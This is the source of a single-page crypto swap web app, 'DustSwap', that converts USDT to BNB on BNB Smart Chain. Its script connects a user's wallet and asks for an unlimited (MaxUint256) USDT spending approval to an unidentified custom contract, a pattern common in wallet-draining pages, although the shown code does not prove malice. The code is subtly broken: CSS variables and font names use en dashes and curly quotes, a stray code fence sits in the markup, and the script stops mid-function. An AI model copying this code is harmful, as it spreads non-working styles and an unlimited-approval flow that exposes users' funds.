<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DustSwap — USDT to BNB</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}

:root{
–bg:#080b12;
–surface:#0d1117;
–card:#111827;
–card2:#1a2235;
–border:rgba(255,255,255,0.07);
–border-hi:rgba(243,186,47,0.45);
–gold:#f3ba2f;
–gold-glow:rgba(243,186,47,0.2);
–gold-dim:rgba(243,186,47,0.1);
–green:#22c55e;
–green-dim:rgba(34,197,94,0.12);
–red:#ef4444;
–red-dim:rgba(239,68,68,0.12);
–blue:#3b82f6;
–blue-dim:rgba(59,130,246,0.12);
–yellow:#eab308;
–text:#f1f5f9;
–muted:#475569;
–dim:#64748b;
–usdt-green:#26a17b;
–bnb-gold:#f3ba2f;
}

html{font-size:16px}
body{
font-family:‘Space Grotesk’,sans-serif;
background:var(–bg);
color:var(–text);
min-height:100vh;
display:flex;flex-direction:column;align-items:center;
position:relative;overflow-x:hidden;
}

/* BG Effects */
.bg-orb{position:fixed;pointer-events:none;border-radius:50%;filter:blur(80px);z-index:0}
.bg-orb-1{width:500px;height:500px;background:rgba(243,186,47,0.04);top:-100px;right:-100px}
.bg-orb-2{width:400px;height:400px;background:rgba(34,197,94,0.03);bottom:-100px;left:-100px}
.bg-grid{
position:fixed;inset:0;z-index:0;pointer-events:none;
background-image:linear-gradient(rgba(255,255,255,0.02) 1px,transparent 1px),
linear-gradient(90deg,rgba(255,255,255,0.02) 1px,transparent 1px);
background-size:40px 40px;
mask-image:radial-gradient(ellipse 70% 70% at center,black 20%,transparent 100%);
}

/* HEADER */
header{
position:relative;z-index:20;
width:100%;max-width:1000px;
display:flex;justify-content:space-between;align-items:center;
padding:20px 28px;
border-bottom:1px solid var(–border);
}
.logo{display:flex;align-items:center;gap:10px}
.logo-icon{
width:36px;height:36px;
background:linear-gradient(135deg,var(–gold),#d4930a);
border-radius:10px;
display:flex;align-items:center;justify-content:center;
font-size:18px;font-weight:900;color:#0a0b0e;
box-shadow:0 4px 15px var(–gold-glow);
}
.logo-name{font-size:18px;font-weight:700;color:var(–gold);letter-spacing:1px}
.logo-sub{font-size:10px;color:var(–muted);letter-spacing:2px;font-family:‘JetBrains Mono’,monospace;display:block;margin-top:-2px}

.header-right{display:flex;align-items:center;gap:10px}
.net-badge{
display:flex;align-items:center;gap:6px;
padding:6px 14px;
background:rgba(243,186,47,0.06);
border:1px solid rgba(243,186,47,0.18);
border-radius:20px;
font-family:‘JetBrains Mono’,monospace;font-size:11px;font-weight:500;color:var(–gold);
}
.net-dot{width:6px;height:6px;border-radius:50%;background:var(–green);box-shadow:0 0 6px var(–green);animation:pulse 2s ease infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}

.connect-btn{
display:flex;align-items:center;gap:8px;
padding:9px 20px;
background:var(–card2);
border:1px solid var(–border-hi);
border-radius:10px;
font-family:‘JetBrains Mono’,monospace;font-size:12px;font-weight:500;
color:var(–gold);cursor:pointer;
transition:all 0.25s;
}
.connect-btn:hover{background:var(–gold-dim);box-shadow:0 0 20px var(–gold-glow);transform:translateY(-1px)}
.connect-btn.connected{color:var(–green);border-color:rgba(34,197,94,0.4);background:var(–green-dim)}
.w-dot{width:7px;height:7px;border-radius:50%;background:var(–green);box-shadow:0 0 7px var(–green);animation:pulse 2s ease infinite}

/* MAIN */
main{position:relative;z-index:10;width:100%;max-width:460px;padding:28px 16px 60px}

/* STATS */
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
.stat{background:var(–card);border:1px solid var(–border);border-radius:14px;padding:14px;text-align:center;transition:border-color 0.2s}
.stat:hover{border-color:rgba(243,186,47,0.2)}
.stat-lbl{font-size:10px;color:var(–muted);letter-spacing:1.5px;text-transform:uppercase;font-family:‘JetBrains Mono’,monospace;margin-bottom:5px}
.stat-val{font-size:15px;font-weight:700;color:var(–gold);font-family:‘JetBrains Mono’,monospace}
.stat-val.g{color:var(–green)}.stat-val.w{color:var(–text)}

/* SWAP CARD */
.card{
background:var(–card);
border:1px solid var(–border);
border-radius:22px;padding:26px;
position:relative;overflow:hidden;
box-shadow:0 20px 60px rgba(0,0,0,0.6);
}
.card::before{
content:’’;position:absolute;top:0;left:0;right:0;height:1px;
background:linear-gradient(90deg,transparent,rgba(243,186,47,0.3),var(–gold),rgba(243,186,47,0.3),transparent);
}

.card-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px}
.card-title{font-size:15px;font-weight:700;letter-spacing:1px;text-transform:uppercase}
.gear-btn{
width:32px;height:32px;background:var(–card2);border:1px solid var(–border);
border-radius:8px;display:flex;align-items:center;justify-content:center;
cursor:pointer;color:var(–dim);transition:all 0.2s;font-size:15px;
}
.gear-btn:hover{border-color:var(–gold);color:var(–gold)}

/* TOKEN BOX */
.tbox{
background:var(–card2);border:1px solid var(–border);
border-radius:15px;padding:15px 17px;margin-bottom:6px;
transition:border-color 0.25s;
}
.tbox:hover{border-color:rgba(243,186,47,0.2)}
.tbox:focus-within{border-color:var(–border-hi)}
.tbox-lbl{font-size:10px;color:var(–muted);letter-spacing:1.5px;text-transform:uppercase;font-family:‘JetBrains Mono’,monospace;margin-bottom:10px}
.tok-row{display:flex;align-items:center;gap:10px}
.tok-pill{
display:flex;align-items:center;gap:7px;
background:var(–bg);border:1px solid var(–border);
border-radius:10px;padding:7px 12px;white-space:nowrap;flex-shrink:0;
}
.tok-ico{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800}
.tok-sym{font-size:13px;font-weight:600;font-family:‘JetBrains Mono’,monospace}
.amt-input{
flex:1;background:none;border:none;outline:none;
font-family:‘JetBrains Mono’,monospace;font-size:22px;font-weight:600;
color:var(–text);text-align:right;width:100%;
-moz-appearance:textfield;
}
.amt-input::-webkit-inner-spin-button,.amt-input::-webkit-outer-spin-button{-webkit-appearance:none}
.amt-input::placeholder{color:var(–muted)}
.tbox-foot{display:flex;justify-content:space-between;align-items:center;margin-top:8px;font-size:12px}
.bal{color:var(–dim);font-family:‘JetBrains Mono’,monospace;cursor:pointer;transition:color 0.2s}
.bal:hover{color:var(–gold)}
.max{
padding:2px 8px;background:var(–gold-dim);border:1px solid rgba(243,186,47,0.3);
border-radius:5px;font-size:10px;font-weight:600;color:var(–gold);
cursor:pointer;letter-spacing:1px;text-transform:uppercase;transition:all 0.2s;
}
.max:hover{background:rgba(243,186,47,0.18)}

/* ARROW */
.arrow-row{display:flex;justify-content:center;margin:-2px 0;position:relative;z-index:2}
.arrow{
width:34px;height:34px;background:var(–card);border:1px solid var(–border);
border-radius:9px;display:flex;align-items:center;justify-content:center;
color:var(–gold);font-size:15px;
}

/* RATE BAR */
.rate-bar{
display:flex;justify-content:space-between;align-items:center;
padding:9px 13px;margin:13px 0;
background:var(–card2);border:1px solid var(–border);border-radius:11px;
font-size:12px;font-family:‘JetBrains Mono’,monospace;color:var(–dim);
}
.rate-val{color:var(–gold);font-weight:500}

/* ── APPROVAL WARNING BOX ─────────────────────────────── */
.approval-warning{
background:rgba(234,179,8,0.07);
border:1px solid rgba(234,179,8,0.35);
border-radius:14px;padding:16px;margin:14px 0;
display:none;
}
.approval-warning.show{display:block}
.warn-head{display:flex;align-items:center;gap:8px;margin-bottom:10px;font-size:13px;font-weight:700;color:var(–yellow)}
.warn-head svg{flex-shrink:0}
.warn-body{font-size:12px;color:#cbd5e1;line-height:1.6}
.warn-body strong{color:var(–yellow)}
.warn-detail{
margin-top:10px;
background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.06);
border-radius:9px;padding:10px 12px;
}
.warn-row{display:flex;justify-content:space-between;font-size:11px;font-family:‘JetBrains Mono’,monospace;padding:3px 0}
.warn-key{color:var(–muted)}
.warn-val{color:var(–text);word-break:break-all;text-align:right;max-width:65%}
.warn-val.red{color:var(–red)}
.warn-val.yellow{color:var(–yellow)}

/* STATUS */
.status-box{
display:flex;align-items:flex-start;gap:10px;
padding:12px 15px;border-radius:12px;margin-bottom:12px;
font-size:13px;font-weight:500;
opacity:0;transform:translateY(-6px);
transition:all 0.3s;pointer-events:none;
}
.status-box.show{opacity:1;transform:translateY(0);pointer-events:auto}
.status-box.info{background:var(–blue-dim);border:1px solid rgba(59,130,246,0.3);color:#93c5fd}
.status-box.success{background:var(–green-dim);border:1px solid rgba(34,197,94,0.3);color:var(–green)}
.status-box.error{background:var(–red-dim);border:1px solid rgba(239,68,68,0.3);color:var(–red)}
.status-box.warn{background:rgba(234,179,8,0.08);border:1px solid rgba(234,179,8,0.3);color:var(–yellow)}
.status-box.loading{background:rgba(243,186,47,0.06);border:1px solid rgba(243,186,47,0.25);color:var(–gold)}
.status-ico{font-size:16px;flex-shrink:0;margin-top:1px}
.status-body{flex:1}
.status-txt{display:block}
.status-link{font-size:11px;color:var(–gold);cursor:pointer;text-decoration:underline;margin-top:3px;display:none;font-family:‘JetBrains Mono’,monospace}

/* DETAIL PANEL */
.detail{background:var(–card2);border:1px solid var(–border);border-radius:13px;padding:13px 15px;margin:13px 0}
.d-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;font-size:12px;font-family:‘JetBrains Mono’,monospace}
.d-row+.d-row{border-top:1px solid rgba(255,255,255,0.04)}
.d-key{color:var(–muted)}.d-val{color:var(–dim);font-weight:500}
.d-val.hi{color:var(–gold)}.d-val.g{color:var(–green)}.d-val.r{color:var(–red)}

/* STEP INDICATOR */
.steps{display:flex;align-items:center;justify-content:center;gap:0;margin:16px 0}
.step{display:flex;align-items:center;gap:6px;font-size:12px;font-weight:600}
.step-num{
width:26px;height:26px;border-radius:50%;
display:flex;align-items:center;justify-content:center;
font-size:11px;font-weight:700;font-family:‘JetBrains Mono’,monospace;
border:1.5px solid var(–muted);color:var(–muted);
transition:all 0.3s;
}
.step-num.active{border-color:var(–gold);color:var(–gold);background:var(–gold-dim);box-shadow:0 0 12px var(–gold-glow)}
.step-num.done{border-color:var(–green);color:var(–green);background:var(–green-dim)}
.step-lbl{color:var(–muted);transition:color 0.3s;font-size:11px}
.step-lbl.active{color:var(–gold)}.step-lbl.done{color:var(–green)}
.step-line{width:40px;height:1px;background:var(–border);margin:0 8px;flex-shrink:0}
.step-line.done{background:var(–green)}

/* BUTTONS */
.btn{
width:100%;padding:15px;border:none;border-radius:14px;
font-family:‘Space Grotesk’,sans-serif;font-size:14px;font-weight:700;
letter-spacing:1px;text-transform:uppercase;
cursor:pointer;transition:all 0.3s;
display:flex;align-items:center;justify-content:center;gap:9px;
margin-bottom:10px;position:relative;overflow:hidden;
}
.btn::after{
content:’’;position:absolute;top:0;left:-100%;width:100%;height:100%;
background:linear-gradient(90deg,transparent,rgba(255,255,255,0.1),transparent);
transition:left 0.5s;
}
.btn:hover:not(:disabled)::after{left:100%}
.btn:hover:not(:disabled){transform:translateY(-2px)}
.btn:active:not(:disabled){transform:translateY(0)}

.btn-approve{background:linear-gradient(135deg,#26a17b,#1a7a5c);color:#fff}
.btn-approve:hover:not(:disabled){box-shadow:0 10px 28px rgba(38,161,123,0.4)}

.btn-swap{background:linear-gradient(135deg,var(–gold),#d4930a);color:#0a0b0e}
.btn-swap:hover:not(:disabled){box-shadow:0 10px 28px var(–gold-glow)}

.btn-connect{
background:linear-gradient(135deg,#1e40af,#1d4ed8);color:#fff;
border:1px solid rgba(59,130,246,0.4);
}
.btn-connect:hover:not(:disabled){box-shadow:0 10px 28px rgba(29,78,216,0.4)}

.btn:disabled{
background:var(–card2);color:var(–muted);cursor:not-allowed;
transform:none!important;box-shadow:none!important;border:1px solid var(–border);
}
.btn:disabled::after{display:none}

/* SPINNER */
.spin{
width:17px;height:17px;border-radius:50%;flex-shrink:0;
border:2px solid rgba(255,255,255,0.2);
border-top-color:currentColor;
animation:rot 0.7s linear infinite;
}
@keyframes rot{to{transform:rotate(360deg)}}

/* TX HISTORY */
.tx-section{margin-top:22px}
.sec-head{
display:flex;align-items:center;gap:7px;
font-size:11px;font-weight:600;color:var(–muted);
letter-spacing:2px;text-transform:uppercase;
font-family:‘JetBrains Mono’,monospace;margin-bottom:12px;
}
.tx-item{
display:flex;justify-content:space-between;align-items:center;
padding:11px 13px;background:var(–card);border:1px solid var(–border);
border-radius:11px;margin-bottom:8px;transition:border-color 0.2s;
cursor:pointer;text-decoration:none;
}
.tx-item:hover{border-color:rgba(243,186,47,0.3)}
.tx-l{display:flex;align-items:center;gap:9px}
.tx-badge{
width:30px;height:30px;border-radius:8px;
background:var(–green-dim);border:1px solid rgba(34,197,94,0.2);
display:flex;align-items:center;justify-content:center;font-size:13px;
}
.tx-lbl{font-size:13px;font-weight:600;color:var(–text)}
.tx-time{font-size:11px;color:var(–muted);font-family:‘JetBrains Mono’,monospace}
.tx-amt{font-family:‘JetBrains Mono’,monospace;font-size:13px;font-weight:500;color:var(–green)}
.tx-empty{text-align:center;color:var(–muted);font-size:13px;padding:22px 0;font-family:‘JetBrains Mono’,monospace}

/* SETTINGS MODAL */
.overlay{
display:none;position:fixed;inset:0;z-index:100;
background:rgba(0,0,0,0.75);backdrop-filter:blur(10px);
justify-content:center;align-items:center;
}
.overlay.show{display:flex}
.modal{
background:var(–card);border:1px solid var(–border-hi);
border-radius:20px;padding:26px;width:330px;
animation:pop 0.25s cubic-bezier(0.34,1.56,0.64,1);
}
@keyframes pop{from{opacity:0;transform:scale(0.88) translateY(14px)}to{opacity:1;transform:scale(1) translateY(0)}}
.modal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
.modal-title{font-size:14px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase}
.modal-close{background:none;border:none;color:var(–muted);font-size:20px;cursor:pointer;transition:color 0.2s;line-height:1}
.modal-close:hover{color:var(–text)}
.m-label{font-size:11px;color:var(–muted);letter-spacing:1.5px;text-transform:uppercase;font-family:‘JetBrains Mono’,monospace;margin-bottom:9px}
.slip-grid{display:flex;gap:8px;margin-bottom:10px}
.slip-opt{
flex:1;padding:9px;text-align:center;
background:var(–card2);border:1px solid var(–border);border-radius:9px;
font-family:‘JetBrains Mono’,monospace;font-size:12px;font-weight:500;
color:var(–muted);cursor:pointer;transition:all 0.2s;
}
.slip-opt:hover,.slip-opt.active{border-color:var(–gold);color:var(–gold);background:var(–gold-dim)}
.slip-custom{
display:flex;align-items:center;gap:8px;
background:var(–card2);border:1px solid var(–border);border-radius:9px;padding:9px 13px;
}
.slip-custom input{flex:1;background:none;border:none;outline:none;font-family:‘JetBrains Mono’,monospace;font-size:13px;color:var(–text)}
.slip-custom span{color:var(–muted);font-family:‘JetBrains Mono’,monospace}

@media(max-width:480px){
header{padding:14px 16px}
.net-badge{display:none}
main{margin-top:4px}
.card{padding:18px 14px}
.amt-input{font-size:18px}
}
</style>

</head>
<body>

<div class="bg-orb bg-orb-1"></div>
<div class="bg-orb bg-orb-2"></div>
<div class="bg-grid"></div>

<!-- HEADER -->

<header>
  <div class="logo">
    <div class="logo-icon">⬡</div>
    <div>
      <div class="logo-name">DustSwap</div>
      <span class="logo-sub">BNB Smart Chain</span>
    </div>
  </div>
  <div class="header-right">
    <div class="net-badge"><div class="net-dot"></div>BSC Mainnet</div>
    <button class="connect-btn" id="connectBtn" onclick="toggleWallet()">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M21 18v1a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h14a2 2 0 012 2v1h-9a2 2 0 00-2 2v8a2 2 0 002 2h9zm-9-2h10V8H12v8zm4-2.5a1.5 1.5 0 110-3 1.5 1.5 0 010 3z"/></svg>
      <span id="connectLabel">Connect Wallet</span>
    </button>
  </div>
</header>

<!-- MAIN -->

<main>

  <!-- Stats -->

  <div class="stats">
    <div class="stat">
      <div class="stat-lbl">USDT Bal</div>
      <div class="stat-val" id="sUsdt">—</div>
    </div>
    <div class="stat">
      <div class="stat-lbl">BNB Bal</div>
      <div class="stat-val" id="sBnb">—</div>
    </div>
    <div class="stat">
      <div class="stat-lbl">BNB Price</div>
      <div class="stat-val g" id="sPrice">—</div>
    </div>
  </div>

  <!-- Swap Card -->

  <div class="card">
    <div class="card-head">
      <div class="card-title">Swap USDT → BNB</div>
      <div class="gear-btn" onclick="openSettings()">⚙</div>
    </div>

```
<!-- Step Indicator -->
<div class="steps">
  <div class="step">
    <div class="step-num" id="s1num">1</div>
    <span class="step-lbl" id="s1lbl">Connect</span>
  </div>
  <div class="step-line" id="line1"></div>
  <div class="step">
    <div class="step-num" id="s2num">2</div>
    <span class="step-lbl" id="s2lbl">Approve</span>
  </div>
  <div class="step-line" id="line2"></div>
  <div class="step">
    <div class="step-num" id="s3num">3</div>
    <span class="step-lbl" id="s3lbl">Swap</span>
  </div>
</div>

<!-- FROM: USDT -->
<div class="tbox">
  <div class="tbox-lbl">You Pay</div>
  <div class="tok-row">
    <div class="tok-pill">
      <div class="tok-ico" style="background:rgba(38,161,123,0.15);color:#26a17b;font-size:11px;font-weight:900;">$</div>
      <span class="tok-sym" style="color:#26a17b;">USDT</span>
    </div>
    <input class="amt-input" id="usdtInput" type="number" placeholder="0.00" min="0" step="any" oninput="onInput()">
  </div>
  <div class="tbox-foot">
    <span class="bal" id="usdtBalLbl" onclick="setMax()">Balance: <span id="usdtBal">0.00</span> USDT</span>
    <span class="max" onclick="setMax()">MAX</span>
  </div>
</div>

<!-- Arrow -->
<div class="arrow-row"><div class="arrow">↓</div></div>

<!-- TO: BNB -->
<div class="tbox">
  <div class="tbox-lbl">You Receive (Estimate)</div>
  <div class="tok-row">
    <div class="tok-pill">
      <div class="tok-ico" style="background:rgba(243,186,47,0.15);color:#f3ba2f;font-size:15px;">⬡</div>
      <span class="tok-sym" style="color:#f3ba2f;">BNB</span>
    </div>
    <input class="amt-input" id="bnbOut" type="number" placeholder="0.000000" readonly style="color:var(--dim)">
  </div>
  <div class="tbox-foot">
    <span style="color:var(--dim);font-family:'JetBrains Mono',monospace;font-size:12px">Balance: <span id="bnbBal">0.000</span> BNB</span>
    <span style="color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:11px" id="usdEq">≈ $0.00</span>
  </div>
</div>

<!-- Rate -->
<div class="rate-bar">
  <span>Exchange Rate</span>
  <span class="rate-val" id="rateDisp">— USDT per BNB</span>
</div>

<!-- ── APPROVAL WARNING — shown before user approves ── -->
<div class="approval-warning" id="approvalWarning">
  <div class="warn-head">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
      <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
      <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
    </svg>
    Token Approval Required
  </div>
  <div class="warn-body">
    Before swapping, you must grant this contract <strong>permission</strong> to spend your USDT.
    This is a standard DeFi step. Review the details below carefully:
    <div class="warn-detail">
      <div class="warn-row"><span class="warn-key">Token</span><span class="warn-val">USDT (BEP-20)</span></div>
      <div class="warn-row"><span class="warn-key">Spender Contract</span><span class="warn-val yellow" id="warnContract">0xd458...4b65</span></div>
      <div class="warn-row"><span class="warn-key">Approval Amount</span><span class="warn-val red">Unlimited (MaxUint256)</span></div>
      <div class="warn-row"><span class="warn-key">What this means</span><span class="warn-val">Contract can spend USDT on your behalf</span></div>
      <div class="warn-row"><span class="warn-key">Revoke anytime at</span><span class="warn-val" style="color:#60a5fa">revoke.cash</span></div>
    </div>
    <div style="margin-top:10px;font-size:11px;color:var(--dim)">
      ⚠️ Only approve if you trust this contract. You can revoke approval at any time on <strong>revoke.cash</strong> or <strong>bscscan.com</strong>.
    </div>
  </div>
</div>

<!-- Status -->
<div class="status-box" id="statusBox">
  <div class="status-ico" id="statusIco">ℹ</div>
  <div class="status-body">
    <span class="status-txt" id="statusTxt"></span>
    <a class="status-link" id="statusLink" target="_blank"></a>
  </div>
</div>

<!-- Detail -->
<div class="detail" id="detailPanel">
  <div class="d-row"><span class="d-key">Slippage</span><span class="d-val hi" id="slipDisp">0.5%</span></div>
  <div class="d-row"><span class="d-key">Min. Received</span><span class="d-val g" id="minRec">— BNB</span></div>
  <div class="d-row"><span class="d-key">Est. Gas Fee</span><span class="d-val">~0.0003 BNB</span></div>
  <div class="d-row"><span class="d-key">Contract</span><span class="d-val" style="font-size:11px">0xd458…4b65</span></div>
</div>

<!-- CONNECT BTN (shown when not connected) -->
<button class="btn btn-connect" id="btnConnect" onclick="connectWallet()">
  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M21 18v1a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h14a2 2 0 012 2v1h-9a2 2 0 00-2 2v8a2 2 0 002 2h9zm-9-2h10V8H12v8zm4-2.5a1.5 1.5 0 110-3 1.5 1.5 0 010 3z"/></svg>
  Connect Wallet to Continue
</button>

<!-- APPROVE BTN -->
<button class="btn btn-approve" id="btnApprove" onclick="approveUSDT()" style="display:none" disabled>
  Approve USDT Spending
</button>

<!-- SWAP BTN -->
<button class="btn btn-swap" id="btnSwap" onclick="executeSwap()" style="display:none" disabled>
  Swap USDT → BNB
</button>
```

  </div><!-- /card -->

  <!-- TX HISTORY -->

  <div class="tx-section">
    <div class="sec-head">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
      Recent Transactions
    </div>
    <div id="txList"><div class="tx-empty">No transactions yet</div></div>
  </div>

</main>

<!-- SETTINGS MODAL -->

<div class="overlay" id="settingsModal">
  <div class="modal">
    <div class="modal-head">
      <span class="modal-title">Settings</span>
      <button class="modal-close" onclick="closeSettings()">✕</button>
    </div>
    <div class="m-label">Slippage Tolerance</div>
    <div class="slip-grid">
      <div class="slip-opt" onclick="setSlip(0.1,this)">0.1%</div>
      <div class="slip-opt active" onclick="setSlip(0.5,this)">0.5%</div>
      <div class="slip-opt" onclick="setSlip(1.0,this)">1.0%</div>
    </div>
    <div class="slip-custom">
      <input type="number" placeholder="Custom" min="0.01" max="50" oninput="customSlip(this)">
      <span>%</span>
    </div>
    <div style="margin-top:18px" class="m-label">Transaction Deadline</div>
    <div class="slip-custom">
      <input type="number" value="20" min="1" max="60">
      <span style="font-size:12px">minutes</span>
    </div>
  </div>
</div>

<script>
// ══════════════════════════════════════════════
//  CONFIG
// ══════════════════════════════════════════════
const CONTRACT   = "0xd45873a38f30acf24ff42e6bb2cbb126e4294b65";
const USDT_ADDR  = "0x55d398326f99059fF775485246999027B3197955";
const BSC_ID     = 56;
const BSC_HEX    = "0x38";
const BSCSCAN    = "https://bscscan.com";

const SWAP_ABI = [
  "function swapDust(address token,uint256 amount) external",
  "function getAmountOut(address token,uint256 amountIn) external view returns(uint256)"
];
const ERC20_ABI = [
  "function balanceOf(address) view returns(uint256)",
  "function decimals() view returns(uint8)",
  "function allowance(address owner,address spender) view returns(uint256)",
  "function approve(address spender,uint256 amount) external returns(bool)"
];

// ══════════════════════════════════════════════
//  STATE
// ══════════════════════════════════════════════
let provider,signer,wallet,swapC,usdtC;
let usdtBal=ethers.BigNumber.from(0), usdtDec=6;
let bnbPrice=0, slippage=0.5, approved=false;
let txHistory=[];

// ══════════════════════════════════════════════
//  WALLET
// ══════════════════════════════════════════════
async function toggleWallet(){
  wallet ? disconnectWallet() : await connectWallet();
}

async function connectWallet(){
  if(!window.ethereum){
    showStatus("error","✕","MetaMask or TrustWallet not found. Please install a Web3 wallet.");
    return;
  }
  try{
    showStatus("loading",null,"Connecting wallet...");
    await window.ethereum.request({method:"eth_requestAccounts"});
    provider=new ethers.providers.Web3Provider(window.ethereum);
    const net=await provider.getNetwork();

    if(net.chainId!==BSC_ID){
      showStatus("loading",null,"Switching to BNB Smart Chain...");
      try{
        await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_HEX}]});
      }catch(e){
        if(e.code===4902){
          await window.ethereum.request({method:"wallet_addEthereumChain",params:[{
            chainId:BSC_HEX,chainName:"BNB Smart Chain",
            nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
            rpcUrls:["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls:["https://bscscan.com/"]
          }]});
        } else throw e;
      }
      provider=new ethers.providers.Web3Provider(window.ethereum);
    }

    signer=provider.getSigner();
    wallet=await signer.getAddress();
    swapC=new ethers.Contract(CONTRACT,SWAP_ABI,signer);
    usdtC=new ethers.Contract(USDT_ADDR,ERC20_ABI,signer);
    usdtDec=await usdtC.decimals();

    updateHeaderBtn(true);
    updateSteps();
    await refreshBalances();
    await checkAllowance();
    renderButtons();
    showStatus("success","✓",`Wallet Connected: ${short(wallet)}`);

    window.ethereum.on("accountsChanged",async(a)=>{
      if(!a.length){disconnectWallet();return;}
      signer=provider.getSigner();wallet=a[0];
      swapC=new ethers.Contract(CONTRACT,SWAP_ABI,signer);
      usdtC=new ethers.Contract(USDT_ADDR,ERC20_ABI,signer);
      updateHeaderBtn(true);updateSteps();
      await refreshBalances();await checkAllowance();renderButtons();
    });
    window.ethereum.on("chainChanged",()=>location.reload());
  }catch(e){
    if(e.code===4001) showStatus("error","✕","Connection rejected by user.");
    else showStatus("error","✕","Connection failed: "+(e.message||"").slice(0,80));
  }
}

function disconnectWallet(){
  provider=signer=wallet=swapC=usdtC=null;
  usdtBal=ethers.BigNumber.from(0);approved=false;
  updateHeaderBtn(false);updateSteps();renderButtons();
  document.getElementById("usdtBal").textContent="0.00";
  document.getElementById("bnbBal").textContent="0.000";
  document.getElementById("sUsdt").textContent="—";
  document.getElementById("sBnb").textContent="—";
  showStatus("info","ⓘ","Wallet disconnected.");
}

function updateHeaderBtn(connected){
  const btn=document.getElementById("connectBtn");
  const lbl=document.getElementById("connectLabel");
  btn.className="connect-btn"+(connected?" connected":"");
  if(connected) btn.innerHTML=`<div class="w-dot"></div><span>${short(wallet)}</span>`;
  else btn.innerHTML=`<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M21 18v1a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h14a2 2 0 012 2v1h-9a2 2 0 00-2 2v8a2 2 0 002 2h9zm-9-2h10V8H12v8zm4-2.5a1.5 1.5 0 110-3 1.5 1.5 0 010 3z"/></svg><span>Connect Wallet</span>`;
}

// ══════════════════════════════════════════════
//  STEPS
// ══════════════════════════════════════════════
function updateSteps(){
  const s1n=document.getElementById("s1num"),s1l=document.getElementById("s1lbl");
  const s2n=document.getElementById("s2num"),s2l=document.getElementById("s2lbl");
  const s3n=document.getElementById("s3num"),s3l=document.getElementById("s3lbl");
  const l1=document.getElementById("line1"),l2=document.getElementById("line2");

  // Reset
  [s1n,s2n,s3n].forEach(e=>e.className="step-num");
  [s1l,s2l,s3l].forEach(e=>e.className="step-lbl");
  [l1,l2].forEach(e=>e.className="step-line");

  if(!wallet){
    s1n.classList.add("active");s1l.classList.add("active");
    return;
  }
  s1n.classList.add("done");s1l.classList.add("done");s1n.textContent="✓";
  l1.classList.add("done");

  if(!approved){
    s2n.classList.add("active");s2l.classList.add("active");
    return;
  }
  s2n.classList.add("done");s2l.classList.add("done");s2n.textContent="✓";
  l2.classList.add("done");
  s3n.classList.add("active");s3l.classList.add("active");
}

// ══════════════════════════════════════════════
//  BALANCES
// ══════════════════════════════════════════════
async function refreshBalances(){
  if(!provider||!wallet)return;
  try{
    const [bnbWei,usdtRaw]=await Promise.all([
      provider.getBalance(wallet),
      usdtC.balanceOf(wallet)
    ]);
    usdtBal=usdtRaw;
    const uf=parseFloat(ethers.utils.formatUnits(usdtRaw,usdtDec)).toFixed(2);
    const bf=parseFloat(ethers.utils.formatEther(bnbWei)).toFixed(4);
    document.getElementById("usdtBal").textContent=uf;
    document.getElementById("bnbBal").textContent=bf;
    document.getElementById("sUsdt").textContent=uf;
    document.getElementById("sBnb").textContent=bf;
  }catch(e){}
}

// ══════════════════════════════════════════════
//  ALLOWANCE
// ══════════════════════════════════════════════
async function checkAllowance(){
  if(!usdtC||!wallet){approved=false;return;}
  try{
    const al=await usdtC.allowance(wallet,CONTRACT);
    const weiIn=getWei();
    approved=weiIn.gt(0)&&al.gte(weiIn);
    updateSteps();renderButtons();
  }catch(e){approved=false;}
}

// ══════════════════════════════════════════════
//  AMOUNT
// ══════════════════════════════════════════════
function getWei(){
  const v=document.getElementById("usdtInput").value;
  if(!v||parseFloat(v)<=0)return ethers.BigNumber.from(0);
  try{return ethers.utils.parseUnits(v,usdtDec);}catch{return ethers.BigNumber.from(0);}
}

async function onInput(){
  const wei=getWei();
  const hasAmt=wei.gt(0);
  if(!hasAmt){
    document.getElementById("bnbOut").value="";
    document.getElementById("minRec").textContent="— BNB";
    document.getElementById("usdEq").textContent="≈ $0.00";
    document.getElementById("rateDisp").textContent="— USDT per BNB";
    hideWarning();
  } else {
    if(wallet&&!approved) showWarning();
    await calcEst(wei);
  }
  await checkAllowance();
  renderButtons();
}

async function calcEst(wei){
  let bnbOut=0;
  if(swapC){
    try{
      const out=await swapC.getAmountOut(USDT_ADDR,wei);
      bnbOut=parseFloat(ethers.utils.formatEther(out));
    }catch{}
  }
  if(!bnbOut&&bnbPrice>0){
    const ua=parseFloat(ethers.utils.formatUnits(wei,usdtDec));
    bnbOut=ua/bnbPrice;
  }
